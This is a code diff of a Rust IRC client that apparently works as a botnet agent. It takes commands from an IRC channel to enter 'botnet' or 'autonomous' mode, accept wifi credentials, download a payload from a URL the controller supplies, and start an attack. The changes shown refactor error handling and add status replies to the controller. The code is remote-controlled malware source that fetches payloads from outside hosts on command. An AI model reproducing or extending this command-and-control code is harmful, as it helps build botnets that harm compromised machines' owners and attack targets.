@@ -81,13 +81,18 @@ impl IRClient {
         Ok(())
     }
 
-    pub fn download_payload(&mut self, url: &str) {
+    pub fn download_payload(&mut self, url: &str) -> anyhow::Result<()> {
         let payload_res = self.http_client.get_payload(url);
         if let Ok(payload) =  payload_res {
             self.received_payload = Some(payload);
+            self.send_message("Downloaded payload!")?;
+            return Ok(());
         } else if let Err(e) = payload_res {
             warn!("Error while downloading: {}", e);
+            return Err(e);
         }
+
+        Ok(())
     }
 
     pub fn initiate_attack(&mut self) {
@@ -114,7 +119,8 @@ impl IRClient {
                 comm if comm.contains(":MODE,AUTO") => self.send_message("Switching to autonomous mode!")?,
                 comm if comm.contains(":MODE,BOT") => self.send_message("Switching to botnet mode!")?,
                 comm if comm.contains(":IRC_DISCONN") || comm.contains(":TERMINATE") => {
-                    self.send_message("Disconnecting from server!")?;
+                    self.send_message("Disconnecting from the server!")?;
+                    self.send_quit()?;
                     return Ok(());
                 }
                 comm if comm.contains(":WIFI,") => self.send_message("Received new wifi credentials, connecting...")?,
@@ -122,23 +128,28 @@ impl IRClient {
                     let url = response.split(',').last();
                     if let Some(payload_url) = url {
                         let mut payload_url = payload_url[0..payload_url.find('\r').unwrap()].to_owned();
-                        self.download_payload(payload_url.as_str());
+                        self.download_payload(payload_url.as_str())?;
                     } else {
                         self.send_message("URL not provided!")?;
                     }
                 },
-                comm if comm.contains(":INIT") => self.initiate_attack(),
+                comm if comm.contains(":INIT") => {
+                    self.send_message("Initiating attack!")?;
+                    self.initiate_attack();
+                    self.send_message("Attack finished!")?;
+                },
                 _ => self.send_message("Unknown command received! Type HELP for list of commands")?
             }
         }
     }
 
-    pub fn client_loop(&mut self) {
-        self.tcp_client.connect_to_server().expect("Unable to connect to server");
-        self.register_user().expect("Register user failed with error");
-        self.join_channel().expect("Unable to join a channel");
-        self.handle_messages().expect("Error while handling messages");
-        self.send_quit().expect("Error while disconnecting from the server");
-        self.tcp_client.close_stream().expect("Error while closing TCP stream");
+    pub fn client_loop(&mut self) -> anyhow::Result<()> {
+        self.tcp_client.connect_to_server()?;
+        self.register_user()?;
+        self.join_channel()?;
+        self.handle_messages()?;
+        self.send_quit()?;
+        self.tcp_client.close_stream()?;
+        Ok(())
     }
 }
